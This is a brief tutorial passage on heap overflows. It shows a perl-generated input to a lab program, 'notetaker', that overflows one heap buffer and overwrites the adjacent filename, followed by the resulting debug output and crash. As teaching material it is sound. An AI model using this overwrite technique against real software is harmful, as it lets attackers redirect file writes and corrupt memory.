Heap overflows are very similar to buffer overflows with a few differences.
- Mainly, they are dangerous to the variables after them in the code, and not before them.
- They also aren’t standardized and usually cause issues because they cause a logical error.

So if we have a program, where there is an overflowable buffer, let’s call it `buffer1` and another, nonoverflowable buffer (`filename`), that is responsible for storing a file to write to, this can be abused.

```bash
❯ ./notetaker $(perl -e 'print "\x90"x112 . "testfile"')
[DEBUG] buffer   @ 0x5655a1a0: 'testfile'
[DEBUG] datafile @ 0x5655a210: 'testfile'
[DEBUG] file descriptor is 3
Note has been saved.
double free or corruption (out)
[1]    14367 IOT instruction (core dumped)  ./notetaker $(perl -e 'print "\x90"x112 . "testfile"')
```

